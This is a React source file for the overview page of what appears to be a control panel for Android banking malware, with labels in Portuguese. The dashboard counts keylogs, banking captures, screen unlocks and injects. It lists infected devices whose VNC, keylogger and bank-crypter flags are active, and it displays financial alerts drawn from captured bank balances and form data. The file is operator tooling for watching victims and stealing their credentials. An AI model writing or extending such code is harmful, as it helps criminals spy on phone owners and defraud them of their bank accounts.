import { useEffect, useState } from 'react';
import useStore from '../../store/index.js';
import { ws } from '../../ws.js';

export default function Overview() {
  const stats     = useStore(s => s.stats);
  const devices   = useStore(s => s.devices);
  const onlineIds = useStore(s => s.onlineIds);
  const connected = useStore(s => s.connected);
  const latency   = useStore(s => s.latency);
  const setTab    = useStore(s => s.setTab);
  const selectDevice = useStore(s => s.selectDevice);
  const [financial, setFinancial] = useState([]);

  const onlineCount  = devices.filter(d => onlineIds.has(d.device_id)).length;
  const totalDevices = devices.length;
  const latClass     = latency < 300 ? '#00c864' : latency < 700 ? '#d4950a' : '#e03060';

  useEffect(() => {
    fetch('/api/financial').then(r => r.json()).then(setFinancial).catch(() => {});
    // Re-fetch on new connection
    const unsub = ws.onMessage(msg => {
      if (msg.type === 'stats') return; // already in store
      if (msg.type === 'bank_balance' || msg.type === 'form_capture') {
        fetch('/api/financial').then(r => r.json()).then(setFinancial).catch(() => {});
      }
    });
    return unsub;
  }, []);

  function goToDevice(id) {
    selectDevice(id);
    setTab('android');
  }

  const onlineDevices  = devices.filter(d => onlineIds.has(d.device_id));
  const offlineDevices = devices.filter(d => !onlineIds.has(d.device_id));

  return (
    <div className="fade-up">
      {/* Robot assistant banner */}
      <div className="card card-sm mb12" style={{ borderColor: 'rgba(59,122,240,.4)', background: 'rgba(20,25,40,.92)' }}>
        <div className="row">
          <div style={{ fontSize: 32 }}>🤖</div>
          <div className="flex1">
            <div className="bold" style={{ color: '#3b7af0' }}>ROBÔ ASSISTENTE</div>
            <div className="txt-xs txt-dim">Comandar Aparelho em Tempo Real</div>
          </div>
          <span className="pill pill-blue">CHAT IA</span>
        </div>
      </div>

      {/* Server status */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📡</span>Server</div>
        <div className="card">
          <div className="card-row">
            <div className="card-icon">📡</div>
            <div className="card-body">
              <div className="card-label">Servidor OXY v4.6</div>
              <div className="row gap6 mt4">
                <span style={{ fontSize: 28, fontWeight: 800, color: latClass }}>
                  {latency || '—'}
                </span>
                <span className="txt-dim txt-sm">ms</span>
              </div>
            </div>
            <div className="card-action">
              <span className={`pill ${connected ? 'pill-green' : 'pill-red'}`}>
                {connected ? 'ONLINE' : 'OFFLINE'}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Stats row */}
      <div className="grid g2 mb12">
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#f0b030' }}>{stats.total_keylogs || 0}</div>
          <div className="txt-xs txt-dim mt4">KEYLOGS</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#e03060' }}>{stats.total_banking || 0}</div>
          <div className="txt-xs txt-dim mt4">BANKING</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#9855e8' }}>{stats.total_unlocks || 0}</div>
          <div className="txt-xs txt-dim mt4">UNLOCKS</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#00c864' }}>{stats.total_injects || 0}</div>
          <div className="txt-xs txt-dim mt4">INJECTS</div>
        </div>
      </div>

      {/* Devices panel — taps through to Android page */}
      <div className="section">
        <div className="section-title">
          <span className="section-icon">📱</span>Dispositivos
        </div>
        <div className="card" style={{ cursor: 'pointer' }} onClick={() => setTab('android')}>
          <div className="card-row">
            <div className="card-icon">📱</div>
            <div className="card-body">
              <div className="card-label">Devices</div>
              <div className="row gap6 mt4">
                <span className="card-value">{totalDevices}</span>
                <span className="txt-dim txt-sm">registrados</span>
              </div>
              <div className="progress mt4">
                <div className="progress-fill"
                  style={{ width: totalDevices ? `${Math.min(100, (onlineCount / totalDevices) * 100)}%` : '0%' }} />
              </div>
            </div>
            <div className="card-action">
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'flex-end' }}>
                <span className="pill pill-green">
                  <span className="dot dot-green" style={{ width: 6, height: 6 }} />
                  {onlineCount} ON
                </span>
                {totalDevices - onlineCount > 0 && (
                  <span className="pill pill-dim" style={{ fontSize: 9 }}>
                    {totalDevices - onlineCount} OFF
                  </span>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Online devices — quick access list (max 5, no duplicates) */}
      {onlineDevices.length > 0 && (
        <div className="section">
          <div className="section-title">
            <span className="section-icon">🟢</span>Online Agora
          </div>
          <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
            {onlineDevices.slice(0, 5).map((d, i) => (
              <div
                key={d.device_id}
                onClick={() => goToDevice(d.device_id)}
                style={{
                  display: 'flex', alignItems: 'center', gap: 10,
                  padding: '10px 14px', cursor: 'pointer',
                  borderBottom: i < Math.min(onlineDevices.length, 5) - 1
                    ? '1px solid rgba(255,255,255,.05)' : 'none',
                  transition: 'background .15s',
                }}>
                <span className="dot dot-green" style={{ flexShrink: 0 }} />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontWeight: 700, fontSize: 12 }} className="txt-truncate">
                    {d.model || d.device_id}
                  </div>
                  <div className="txt-xs txt-dim">
                    Android {d.android_version || '?'} · {d.battery_level || 0}%
                  </div>
                </div>
                <div style={{ display: 'flex', gap: 4, flexShrink: 0 }}>
                  {d.vnc_active       && <span className="pill pill-blue"   style={{ fontSize: 9 }}>VNC</span>}
                  {d.keylogger_active && <span className="pill pill-red"    style={{ fontSize: 9 }}>KL</span>}
                  {d.banks_crypter    && <span className="pill pill-purple" style={{ fontSize: 9 }}>CRYPT</span>}
                </div>
                <span style={{ color: 'var(--text3)', fontSize: 16, flexShrink: 0 }}>›</span>
              </div>
            ))}
            {onlineDevices.length > 5 && (
              <div style={{ padding: '8px 14px', fontSize: 11, color: 'var(--text3)', textAlign: 'center',
                borderTop: '1px solid rgba(255,255,255,.05)', cursor: 'pointer' }}
                onClick={() => setTab('android')}>
                +{onlineDevices.length - 5} mais dispositivos →
              </div>
            )}
          </div>
        </div>
      )}

      {/* Stored APKs */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📦</span>APKs</div>
        <div className="card">
          <div className="card-row">
            <div className="card-icon">📦</div>
            <div className="card-body">
              <div className="card-label">Stored Apps</div>
              <div className="row gap6 mt4">
                <span className="card-value">{stats.stored_apks || 0}</span>
                <span className="txt-dim txt-sm">APKs</span>
              </div>
            </div>
            <div className="card-action">
              <button className="btn btn-gold btn-sm">Meus Apps ⚡</button>
            </div>
          </div>
        </div>
      </div>

      {/* Financial alerts */}
      <div className="section">
        <div className="section-title"><span className="section-icon">💰</span>Alertas Financeiros</div>
        <div className="card">
          <div className="row-sb mb8">
            <div>
              <span className="dot dot-gold" style={{ display: 'inline-block', marginRight: 6 }} />
              <span className="txt-sm bold" style={{ color: '#d4950a' }}>Alertas Financeiros:</span>
            </div>
            <span className="pill pill-gold">SISTEMA ATIVO</span>
          </div>
          {financial.length === 0 ? (
            <div className="txt-dim txt-sm">Nenhum alerta financeiro recente</div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {financial.slice(0, 6).map((f, i) => (
                <div key={i} className="row-sb"
                  style={{ padding: '6px 0', borderBottom: '1px solid rgba(212,149,10,.1)' }}>
                  <div>
                    <span className="txt-sm" style={{ color: '#e03060', fontWeight: 700 }}>{f.bank}</span>
                    <span className="txt-xs txt-dim" style={{ marginLeft: 8 }}>{f.alert}</span>
                  </div>
                  <span className="txt-xs txt-dim">
                    {f.ts ? new Date(f.ts).toLocaleTimeString() : ''}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      <div style={{ height: 24 }} />
    </div>
  );
}
